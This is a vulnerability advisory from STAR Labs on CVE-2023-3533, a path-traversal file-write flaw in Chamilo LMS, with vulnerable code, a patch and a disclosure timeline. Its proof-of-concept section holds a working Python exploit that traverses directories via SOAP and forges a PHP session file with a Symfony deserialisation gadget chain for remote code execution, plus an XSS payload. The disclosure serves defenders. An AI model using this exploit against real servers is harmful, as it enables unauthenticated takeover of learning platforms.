* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from starlabs.sg_2e38c3e3_20250114_223426.html ===

[![logo](https://starlabs.sg/logo-white.png)](https://starlabs.sg/ "  (Alt + H)")

* [Home](https://starlabs.sg/ "Home")
* [About](https://starlabs.sg/about/ "About")
* [Advisories](https://starlabs.sg/advisories/ "Advisories")
* [Blog](https://starlabs.sg/blog/ "Blog")
* [Achievements](https://starlabs.sg/achievements/ "Achievements")
* [Publications](https://starlabs.sg/publications/ "Publications")
* [Search](https://starlabs.sg/search/ "Search (Alt + /)")

[Home](https://starlabs.sg/) » [Advisories](https://starlabs.sg/advisories/)
# (CVE-2023-3533) Chamilo LMS Unauthenticated Remote Code Execution via Arbitrary File Write

November 28, 2023 · 7 min · Ngo Wei Lin (@Creastery)

Table of Contents

* [Summary](#summary)
* [CVSS3.1 Scoring System](#cvss31-scoring-system)
* [Product Overview](#product-overview)
* [Vulnerability Summary](#vulnerability-summary)
* [Vulnerability Details](#vulnerability-details)
* [Exploit Conditions](#exploit-conditions)
* [Proof-of-Concept](#proof-of-concept)
* [Suggested Mitigations](#suggested-mitigations)
* [Detection Guidance](#detection-guidance)
* [Credits](#credits)
* [Timeline](#timeline)

## Summary[#](#summary)

| **Product** | Chamilo |
| --- | --- |
| **Vendor** | Chamilo |
| **Severity** | High - Adversaries may exploit software vulnerabilities to obtain unauthenticated remote code execution. |
| **Affected Versions** | <= v1.11.20 |
| **Tested Versions** | v1.11.20 (latest version as of writing) |
| **CVE Identifier** | CVE-2023-3533 |
| **CVE Description** | Path traversal in file upload functionality in `/main/webservices/additional_webservices.php` in Chamilo LMS <= v1.11.20 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via arbitrary file write. |
| **CWE Classification(s)** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’) |
| **CAPEC Classification(s)** | CAPEC-139: Relative Path Traversal, CAPEC-76: Manipulating Web Input to File System Calls |

## CVSS3.1 Scoring System[#](#cvss31-scoring-system)

**Base Score:** 9.8 (Critical)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:N/C:H/I:H/A:H`

| **Metric** | **Value** |
| --- | --- |
| **Attack Vector (AV)** | Network |
| **Attack Complexity (AC)** | Low |
| **Privileges Required (PR)** | None |
| **User Interaction (UI)** | None |
| **Scope (S)** | Unchanged |
| **Confidentiality (C)** | High |
| **Integrity (I)** | High |
| **Availability (A)** | High |

## Product Overview[#](#product-overview)

Chamilo is an open-source PHP-based Learning Management System (LMS) that facilitates online education and training. It offers features such as course creation, content management, assessments, collaboration and delivering educational resources.

## Vulnerability Summary[#](#vulnerability-summary)

An overlooked relative path traversal vulnerability in `main/webservices/additional_webservices.php` allows for arbitrary file write, which may be exploited by an unauthenticated attacker to perform stored cross-site scripting attacks, as well as obtain remote code execution.

***Note:** This vulnerability is found in the same location as another vulnerability (CVE-2023-34960) exploited in the wild. As such, we strongly recommend Chamilo users to apply the latest security patches to mitigate this and 9 other high-severity vulnerabilities reported by STAR Labs.*

## Vulnerability Details[#](#vulnerability-details)

There is an arbitrary file write vulnerability in the same vulnerable function as CVE-2023-34960 and CVE-2023-3368.

The relevant vulnerable code from [`main/webservices/additional_webservices.php`](https://github.com/chamilo/chamilo-lms/blob/v1.11.20/main/webservices/additional_webservices.php#L20-L57)is as follows:

```
function wsConvertPpt($pptData)
{
    $fileData = $pptData['file_data'];
    // Clean filename to avoid hacks. Prevents "&" and ";" to be used in filename, notably
    $sanitizedFileName = Security::sanitizeExecParam($pptData['file_name']); // [1]
    $dataInfo = pathinfo($sanitizedFileName);
    $fileName = basename($sanitizedFileName, '.'.$dataInfo['extension']); // [2]
    // Add additional cleaning of .php and .htaccess files
    $fullFileName = Security::filter_filename($sanitizedFileName); // [3]
    ...
    $tempArchivePath = api_get_path(SYS_ARCHIVE_PATH); // [4]
    $tempPath = $tempArchivePath.'wsConvert/'.$fileName.'/';  // [5]
    ...
    $file = base64_decode($fileData);
    file_put_contents($tempPath.$fullFileName, $file); // [6]
}

```

At [1], the user-supplied `file_name` in the SOAP request is sanitised using [`Security::sanitizeExecParam()`](https://github.com/chamilo/chamilo-lms/blob/v1.11.20/main/inc/lib/security.lib.php#L633-L636):

```
public static function sanitizeExecParam(string $param): string
{
    return preg_replace('/[`;&|]/', '', $param);
}

```

Notice that the sanitisation function does not remove dots (`.`) and forward slashes (`/`).

At [2], `$fileName` is simply the component following the final `/` found in user-supplied `file_name` in the SOAP request.

At [3], it can be seen that `Security::filter_filename()` is used to perform another round of sanitisation:

```
public static function filter_filename($filename)
{
    return disable_dangerous_file($filename);
}

```

The implementation of the `disable_dangerous_file()` function can be found in [main/inc/lib/fileUpload.lib.php](https://github.com/chamilo/chamilo-lms/blob/v1.11.20/main/inc/lib/fileUpload.lib.php#L27-L58):

```
function php2phps($file_name)
{
    return preg_replace('/\.(phar.?|php.?|phtml.?)(\.){0,1}.*$/i', '.phps', $file_name);
}
...
function htaccess2txt($filename)
{
    return str_replace(['.htaccess', '.HTACCESS'], ['htaccess.txt', 'htaccess.txt'], $filename);
}
...
function disable_dangerous_file($filename)
{
    return htaccess2txt(php2phps($filename));
}

```

As seen above, the purpose of the `disable_dangerous_file()` function is to ensure that the file is not a `.htaccess` file or uses a recognised PHP extension (e.g. `.php`, `.phar`, etc.)

Therefore, the sanitisation rules applied at [1] and [3] respectively do not help to prevent path traversal attacks. Note that at this point, both `$fileName` and `$fullFileName` may contain relative path traversal payloads (i.e. `../`).

Subsequently at [3], arbitrary file write can be achieved at [3].

Consequently, it is possible to achieve stored cross-site scripting (XSS) by placing a malicious HTML file in any of the writable and publicly-accessible directory within the web root as per [Chamilo’s security hardening guide](https://11.chamilo.org/documentation/security.html#5.Files-permissions):

* `app/cache/`
* `app/courses/`
* `app/home/`
* `app/logs/`
* `app/upload/`
* `main/default_course_document/images/`

Most notably, an unauthenticated attacker can achieve remote code execution even if the web root is non-writable!

This can be achieved by forging a PHP session file containing a deserialisation gadget chain and loading any page (such as `/index.php`) which calls `session_start()` to trigger the remote code execution payload.

## Exploit Conditions[#](#exploit-conditions)

An unauthenticated attacker is expected to be able to trigger the stored XSS reliably.

To achieve remote code execution, the unauthenticated attacker must know the path of the PHP sessions directory (e.g. `/tmp/`, `/var/lib/php/session`).

## Proof-of-Concept[#](#proof-of-concept)

1. Save the following proof-of-concept exploit script as `unauth-file-write.py`:
   ```
   #!/usr/bin/env python3
   import argparse
   import base64
   import random
   import string
   import subprocess
   import requests
   PHP_SERIALISED_PAYLOAD_GENERATOR = r'''
   /*
       Uses the modified ambionics/phpggc's Symfony/RCE11 gadget chain found at:
       https://github.com/ambionics/phpggc/pull/155/files
   */
   namespace Symfony\Component\Security\Core\Authentication\Token {
       class AnonymousToken implements \Serializable
       {
           public $parentData;
           public function __construct($parentData)
           {
               $this->parentData = $parentData;
           }
           public function serialize()
           {
               return serialize([null, $this->parentData]);
           }
           public function unserialize($serialized)
           {
           }
       }
   }
   namespace Symfony\Component\Validator {
       class ConstraintViolationList
       {
           private $violations;
           public function __construct($violations)
           {
               $this->violations = $violations;
           }
       }
   }
   namespace Symfony\Component\Finder\Iterator
   {
       class SortableIterator
       {
           private $iterator;
           private $sort;
           function __construct($iterator, $sort)
           {
               $this->iterator = $iterator;
               $this->sort = $sort;
           }
       }
   }
   /*
       Generate the session file contents
   */
   namespace {
       $args = array_slice($argv, 1);
       if (count($args) < 2) {
           $args = ["system", "id"];
       }
       $a = new \Symfony\Component\Validator\ConstraintViolationList($args);
       $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
       $c = new \Symfony\Component\Validator\ConstraintViolationList($b);
       $d = new \Symfony\Component\Security\Core\Authentication\Token\AnonymousToken($c);
       session_start();
       $_SESSION["_"] = $d;
       echo base64_encode(session_encode()), "\n";
   }
   '''.strip()
   SOAP_REQUEST_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{url}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string">{file_data}</value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">{file_path}</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>
   '''
   def xss(args):
       '''
       Based on Chamilo's security hardening guide at: https://11.chamilo.org/documentation/security.html#5.Files-permissions
       The following directories in web root must be writable by webserver:
       - app/cache/
       - app/courses/
       - app/home/
       - app/logs/
       - app/upload/
       - main/default_course_document/images/
       '''
       file_path = ''.join([
           '../../../../', # in default config, traverse up 4 times to reach web root
           args.file
       ])
       file_data = base64.b64encode(args.payload.encode('latin-1')).decode('latin-1')
       data = SOAP_REQUEST_TEMPLATE.format(url=args.url, file_path=file_path, file_data=file_data)
       try:
           response = requests.post(f'{args.url}/main/webservices/additional_webservices.php', data=data, headers={'Content-Type': 'application/xml'})
           print(f'Writing to {args.file} in web root directory')
           if '../' in args.file:
               print('[!] Unable to verify arbitrary file write remotely if writing to outside of web root.')
               return False
           xss_url = f'{args.url}/{args.file.lstrip("/")}'
           response = requests.get(xss_url)
           print(f'Checking if writing of file to {args.file} can be found at: {xss_url}')
           return response.text == args.payload
       except:
           return False
   def rce(args):
       session_id_charset = string.ascii_letters + string.digits
       session_id = ''.join(random.choice(session_id_charset) for i in range(32))
       session_file_path = ''.join([
           '../../../../',                    # in default config, traverse up 4 times to reach web root
           "../" * args.web_root.count("/"),  # traverse up to /
           args.session_directory.strip("/"), # go into directory containing session files
           f'/sess_{session_id}',              # session file name
       ])
       print(f'Overwriting session file at: {session_file_path}')
       proc = subprocess.Popen(['php', '-r', 'eval(file_get_contents("php://stdin"));'] + args.payload, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
       session_deserialisation_payload = proc.communicate(input=PHP_SERIALISED_PAYLOAD_GENERATOR.encode('latin-1'))[0].decode('latin-1').strip()
       data = SOAP_REQUEST_TEMPLATE.format(url=args.url, file_path=session_file_path, file_data=session_deserialisation_payload)
       try:
           response = requests.post(f'{args.url}/main/webservices/additional_webservices.php', data=data, headers={'Content-Type': 'application/xml'})
           print(f'Setting {args.sid}={session_id}')
           response = requests.get(f'{args.url}/', cookies={args.sid: session_id})
           print(f'Invoking {args.payload[0]}() with arguments: {", ".join(args.payload[1:])}')
           data = response.text.split('<!DOCTYPE html>', maxsplit=1)[0]
           print(f'Found data:\n{data}')
           return len(data) != 0
       except:
           return False
   def main():
       parser = argparse.ArgumentParser()
       parser.add_argument('-u', '--url', help='Url of your Chamilo', required=True)
       parser.add_argument('-r', '--web-root', help='Specify web root (default: /var/www/chamilo/)', type=str, default='/var/www/chamilo/')
       exploit_subparsers = parser.add_subparsers(title='exploit', dest='exploit', required=True)
       xss_subparser = exploit_subparsers.add_parser('xss', help='XSS in web root')
       xss_subparser.add_argument('-f', '--file', help='File to write to (relative to web root directory)', type=str, default='main/default_course_document/images/pwned.html')
       xss_subparser.add_argument('-p', '--payload', help='Contents of the file', type=str, default='<script>alert(document.domain)</script>')
       rce_subparser = exploit_subparsers.add_parser('rce', help='RCE via session file deserialisation')
       rce_subparser.add_argument('-sd', '--session-directory', help='Specify session directory (default: /tmp/)', type=str, default='/tmp/')
       rce_subparser.add_argument('-sid', '--sid', help='Specify session ID cookie name (default: ch_sid)', type=str, default='ch_sid')
       rce_subparser.add_argument('-p', '--payload', help='Space-delimited PHP function and arguments to execute (default: system id)', type=str, nargs='*', default=['system', 'id'])
       args = parser.parse_args()
       exploits = {
           'xss': xss,
           'rce': rce
       }
       exploit = exploits[args.exploit]
       if exploit(args):
           print(f'URL vulnerable: {args.url}')
       else:
           print(f'URL not vulnerable: {args.url}')
   if __name__ == '__main__':
       main()

   ```
2. Run the exploit script using `python3 unauth-file-write.py -u http://<chamilo> rce -p system id. For example, the following command invokes the` id` shell command output on the target:
   ```
   $ python3 unauth-file-write.py -u http://<chamilo> rce -p system id

   ```
3. The following output confirms the vulnerability when executing the proof-of-concept exploit script:
   ```
   Overwriting session file at: ../../../../../../../../tmp/sess_zerCeizyXIGHTRczlabXFaLozclTBSyE
   Setting ch_sid=zerCeizyXIGHTRczlabXFaLozclTBSyE
   Invoking system() with arguments: id
   Found data:
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ...
   URL vulnerable: http://<chamilo>

   ```

## Suggested Mitigations[#](#suggested-mitigations)

Ensure that the destination file path does not traverse out of the intended directory (i.e. `SYS_ARCHIVE_PATH`).
A simple fix would be to stop processing the request if the substring `..` is found in the user-supplied `file_name`.

For example:

```
function wsConvertPpt($pptData)
{
    global $_configuration;
    $ip = trim($_SERVER['REMOTE_ADDR']);
    // If an IP filter array is defined in configuration.php,
    // check if this IP is allowed
    if (!empty($_configuration['ppt2lp_ip_filter'])) {
        if (!in_array($ip, $_configuration['ppt2lp_ip_filter'])) {
            return false;
        }
    }
    $fileData = $pptData['file_data'];
+    if (strpos($pptData['file_name'], '..') !== false) {
+	    return false;
+    }
    ...

```

End users are encouraged to update to the latest version of Chamilo.

## Detection Guidance[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by checking the server’s access logs for all requests made to `/main/webservices/additional_webservices.php`.

## Credits[#](#credits)

Ngo Wei Lin ([@Creastery](https://twitter.com/Creastery)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg))

## Timeline[#](#timeline)

* 2023-07-13 Vendor Disclosure
* 2023-07-14 Initial Vendor Contact
* 2023-07-18 Vendor published the vulnerability sumamry
* 2023-07-17 Mutual agreement to delay the publication of vulnerability details was reached in light of the recent [in-the-wild exploitation of Chamilo N-day vulnerability (CVE-2023-34960)](https://github.com/chamilo/chamilo-lms/issues/4813)
* 2023-08-03 Vendor Patch Release (v1.11.22) completely fixing vulnerability
* 2023-11-28 Public Disclosure

[« Prev

(CVE-2023-3368) Chamilo LMS Unauthenticated Command Injection](https://starlabs.sg/advisories/23/23-3368/)
[Next »

(CVE-2023-3545) Chamilo LMS Htaccess File Upload Security Bypass](https://starlabs.sg/advisories/23/23-3545/)

© 2025 [STAR Labs](https://starlabs.sg/)
Powered by
[Hugo](https://gohugo.io/) &
[PaperMod](https://git.io/hugopapermod)


